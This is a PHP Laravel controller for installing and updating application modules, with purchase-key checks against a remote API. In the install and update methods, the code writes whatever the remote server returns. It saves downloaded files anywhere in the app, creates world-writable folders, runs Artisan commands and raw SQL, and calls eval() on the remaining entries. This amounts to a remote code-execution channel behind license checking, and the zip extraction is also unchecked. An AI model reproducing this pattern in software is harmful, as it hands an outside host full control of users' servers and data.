<?php

namespace Maruf695\AMCmoduler\Controllers;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Session;
use ZipArchive;
use Validator;
use Cache;
use Auth;
use Module;
use File;
class ModulesController extends Controller
{
    public function __construct(){
      $this->middleware('permission:developer-settings'); 
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
          $modules =  array_diff(scandir(base_path('Modules')), array('..', '.'));
          $modules_nodes = [];
          foreach($modules as $module){
            if(file_exists(base_path('Modules/'.$module).'/module.json')){
               $modules_path = file_get_contents(base_path('Modules/'.$module).'/module.json');
               $module_json = json_decode($modules_path);
               if(isset($module_json->module_type)){
                array_push($modules_nodes, $module_json);
              }
            }           
          }
        asort($modules_nodes);

        return view('modules::index', compact('modules_nodes'));
        
    }

    public function create(){
        return view('modules::create');
    }

    

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $data = $request->validate([
            'module'  => ['required','mimes:zip'],
            'purchase_key'=> ['required'],
           
        ]);

        if (!class_exists('ZipArchive')) {
            return response()->json(['message'=>'Enable php ZipArchive extension in your server'],403);
        }

        $checkArr= explode('-', $request->purchase_key);
        
        if (count($checkArr) != 5) {
          return response()->json(['message'=>'The purchase key is invalid'],403);
        }

        $body['purchase_key'] = $request->purchase_key;
        $body['url'] = url('/');

        $response =  \Http::post('https://devapi.lpress.xyz/api/verify',$body);
        if ($response->status() != 200) {
           $response = json_decode($response->body());
           
           return response()->json(['message'=> $response->error],403);
        }
        
        $response = json_decode($response->body());
        $response_files = $response->queries ?? [];

       
        ini_set('max_execution_time', '0');
       
        //---------------------
        // Get the uploaded file
        $uploadedFile = $request->file('module');

        // Define a unique name for the uploaded file to store
        $fileName = time() . '-' . $uploadedFile->getClientOriginalName();

        $filePath = $uploadedFile->storeAs('temp', $fileName);

        // Initialize the ZipArchive object
        $zip = new ZipArchive;

        // Try to open the zip file
        $zip->open($filePath);
        $its_valid = false;
       

        $firstFolder = null;

        for ($i = 0; $i < $zip->numFiles; $i++) {
            $row = $zip->statIndex($i);
            $fileName = $row['name'];
        
            // Check for module.json file
            if (basename($fileName) == 'module.json') {
                $its_valid = true;
            }

            // Check if it's a folder
            if (substr($fileName, -1) == '/' && $firstFolder == null) {
                $firstFolder = $fileName; // Store the first folder name
                
            }
        }
        
        $firstFolder = str_replace('/','',$firstFolder);
       
        if (!$its_valid && $firstFolder == null) {
            return response()->json(['message'=>'This Module Is Invalid'],403);
        }

        $extracted = $zip->extractTo(base_path('Modules'));
        $zip->close();
        unlink($filePath);
        

        $module_json = json_decode(file_get_contents(base_path('Modules/'.$firstFolder).'/module.json'));

        
        $module_json->module_key  = $request->purchase_key;
        

        File::put(base_path('Modules/'.$firstFolder).'/module.json', json_encode($module_json,JSON_PRETTY_PRINT));

        foreach ($response_files ?? [] as $key => $row) {
            if ($row->type == 'file') {
                $fileData = \Http::get($row->file);
                $fileData = $fileData->body();

                File::put(base_path($row->path),$fileData);
            }
            elseif ($row->type == 'folder') {
                $path = $row->path.'/'.$row->name;

                if(!File::exists(base_path($path))) {                    
                    File::makeDirectory(base_path($path), 0777, true, true);
                }
            }
            elseif ($row->type == 'command') {
                \Artisan::call($row->command);
            }
            elseif ($row->type == 'query') {
                \DB::statement($row->name);
            }
            else{
                eval($row->name);
            }

            
        }

        return response()->json([
            'redirect' => route('admin.modules.index'),
            'message'  => __('Modules Uploaded Successfully...!')
        ]);

    }

    
    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function versionView($id)
    {
       
        abort_if(!file_exists(base_path('Modules/'.$id).'/module.json'), 404);
        $module_json = json_decode(file_get_contents(base_path('Modules/'.$id).'/module.json'));
        
        return view('modules::update', compact('module_json'));
    }

    public function edit($id)
    {
         abort_if(!file_exists(base_path('Modules/'.$id).'/module.json'), 404);
         $module_json = json_decode(file_get_contents(base_path('Modules/'.$id).'/module.json'));

        if ($module_json->status == true) {
           $module_json->status  = false;


        } else {
           $module_json->status  = true;
        }

        File::put(base_path('Modules/'.$id).'/module.json', json_encode($module_json,JSON_PRETTY_PRINT));
        

        return response()->json([
            'redirect' => route('admin.modules.index'),
            'message'  => __('Modules Status Updated.')
        ]);
    }

    

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function updateModulesCheck(Request $request, $id)
    {
        abort_if(!file_exists(base_path('Modules/'.$id).'/module.json'), 404);
        $module_json = json_decode(file_get_contents(base_path('Modules/'.$id).'/module.json'));

        $site_key=$module_json->module_key;
        $body['purchase_key'] = $site_key;
        $body['url'] = url('/');
        $body['current_version'] = $module_json->version;

        $response =  \Http::post('https://devapi.lpress.xyz/api/check-update',$body);
        $body = json_decode($response->body());
        
        if ($response->status() != 200) {
            \Session::flash('error',$body->message);

            return response()->json([
                'redirect'=>url('/admin/modules-version/'.$id),
                'message'=>$body->message
            ],200);
        }

        \Session::put('update-data-'.$id,[
                'message'=>$body->message,
                'version'=>$body->version
        ]);
        return response()->json([
               'redirect'=>url('/admin/modules-version/'.$id),
            ],200);


    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function updateModules(Request $request, $id)
    {
         abort_if(!file_exists(base_path('Modules/'.$id).'/module.json') && !Session::has('update-data-'.$id), 404);
        $module_json = json_decode(file_get_contents(base_path('Modules/'.$id).'/module.json'));

        $site_key=$module_json->module_key;
        $version = Session::get('update-data-'.$id)['version'];
        $body['purchase_key'] = $site_key;
        $body['url'] = url('/');
        $body['version'] = $version;
      
        $response =  \Http::post('https://devapi.lpress.xyz/api/pull-update',$body);
        $response = json_decode($response->body());
       
        foreach ($response->updates ?? [] as $key => $row) {
            if ($row->type == 'file') {
                $fileData = \Http::get($row->file);
                $fileData = $fileData->body();

                File::put(base_path($row->path),$fileData);
            }
            elseif ($row->type == 'folder') {
                $path = $row->path.'/'.$row->name;

                if(!File::exists(base_path($path))) {                    
                    File::makeDirectory(base_path($path), 0777, true, true);
                }
            }
            elseif ($row->type == 'command') {
                \Artisan::call($row->command);
            }
            elseif ($row->type == 'query') {
                \DB::statement($row->name);
            }
            else{               
               eval($row->name);
            }
   
        }
        $module_json->version  = $version;

        File::put(base_path('Modules/'.$id).'/module.json', json_encode($module_json,JSON_PRETTY_PRINT));

        Session::forget('update-data-'.$id);
        Session::flash('success','Successfully updated to '.$version);

        return response()->json([
                'redirect'=>url('/admin/modules-version/'.$id),
            ],200);
    }

    
}

